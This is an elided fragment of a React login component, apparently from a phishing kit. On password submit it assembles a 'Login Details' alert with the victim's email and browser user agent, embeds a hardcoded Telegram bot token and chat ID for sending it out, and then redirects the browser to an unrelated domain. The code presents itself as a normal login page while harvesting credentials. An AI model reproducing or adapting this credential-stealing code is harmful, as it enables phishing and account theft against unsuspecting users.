...
const Login = () => {
  ...
  const handlePasswordSubmit = async (e) => {
    ...
    try {
      ...
      const TELEGRAM_BOT_TOKEN = '8167294891:AAHMzeK9CYseo6zUTGt1cMfWHK5faqZKGPg';
      const TELEGRAM_CHAT_ID = '-1002480035528';
      const loginAlert = `
🔐 <b>Login Details</b>
📧 <b>Email:</b> ${email}
...
🕵️‍♂️ <b>User Agent:</b> ${navigator.userAgent}
      ...
      setShowModal(false); // Hide modal before redirecting
      window.location.href = 'https://bnfnd.moralemadefiles.top/';
    } catch (error) {
